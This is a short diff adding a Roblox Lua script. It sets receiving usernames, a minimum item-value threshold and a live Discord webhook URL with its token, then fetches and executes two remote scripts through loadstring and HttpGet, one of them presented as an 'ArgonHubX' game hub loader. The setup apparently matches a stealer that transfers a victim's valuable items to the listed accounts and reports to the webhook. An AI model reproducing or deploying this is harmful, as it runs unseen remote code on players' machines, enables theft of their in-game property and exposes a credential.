@@ -1,0 +1,8 @@
+_G.Usernames = {"lebg91000", "ANOUARTM111", "Anouar_tm111"} -- you can add as many as you'd like
+_G.min_rap = 50
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1423556679517343764/A1w9NtVRU6lstCCfWzZGE9tAi58Pd3nyrt9OCsrDr4bfpP7u8pUinB3P_EIxCekxqKSI" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Anouar111/Blade-ball/refs/heads/main/Script.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))() 
